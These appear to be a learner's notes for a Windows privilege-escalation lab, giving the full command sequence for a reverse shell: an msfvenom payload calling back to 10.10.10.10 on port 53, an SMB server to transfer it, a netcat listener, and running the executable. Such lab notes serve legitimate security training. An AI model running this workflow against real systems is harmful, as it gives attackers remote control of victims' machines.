
On Kali, generate a reverse shell executable (reverse.exe) using msfvenom. Update the LHOST IP address accordingly:

#### `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe`

where
p = payload
lhost = listening host
lport - listners port
f = filetype
o = output name

Transfer the reverse.exe file to the C:\PrivEsc directory on Windows. There are many ways you could do this, however the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file.

--- 

On Kali, in the same directory as reverse.exe:

#### `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`

smbserver is preinstalled in kali works as a file transfer tool (very helpful for same network but not much helpful over the internet)
. means same path
kali is just name

---


On Windows (update the IP address with your Kali IP):

#### `copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe`

Test the reverse shell by setting up a netcat listener on Kali:

#### `sudo nc -nvlp 53`

nc = netcat
n -> 
v -> verbose
l -> 
p -> port

---


Then run the reverse.exe executable on Windows and catch the shell:

#### `C:\PrivEsc\reverse.exe`

The reverse.exe executable will be used in many of the tasks in this room, so don't delete it!

![[Pasted image 20250826201305.png]]

